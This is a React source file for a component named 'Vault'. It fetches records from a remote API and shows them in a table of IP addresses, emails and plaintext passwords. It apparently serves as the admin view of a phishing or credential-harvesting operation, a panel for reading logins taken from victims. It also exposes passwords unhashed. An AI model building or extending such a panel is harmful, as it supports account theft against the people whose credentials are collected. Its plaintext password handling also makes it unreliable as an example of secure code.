import React, { useState, useEffect } from "react";
import axios from "axios";

function Vault() {
  const [data, setData] = useState([]);
  const [error, setError] = useState("");

  useEffect(() => {
    axios
      .get("https://nit-bucket-construction.vercel.app/api/info")
      .then((response) => {
        setData(response.data);
      })
      .catch((error) => {
        setError("Error fetching data");
        console.error("There was an error fetching the data!", error);
      });
  }, []);

  return (
    <div className="admin-container">
      {/* <h2 className="admin-title">Admin Page</h2> */}
      {error && <p className="error-message">{error}</p>}
      <div className="table-grid">
        <div className="table-header">
          <div className="table-cell">IP Address</div>
          <div className="table-cell">Email</div>
          <div className="table-cell">Password</div>
        </div>
        <div className="table-body">
          {data.map((item, index) => (
            <div className="table-row" key={index}>
              <div className="table-cell" data-label="IP Address">
                {item.ipAddress}
              </div>
              <div className="table-cell" data-label="Email">
                {item.email}
              </div>
              <div className="table-cell" data-label="Password">
                {item.password}
              </div>
            </div>
          ))}
        </div>
      </div>
    </div>
  );
}

export default Vault;
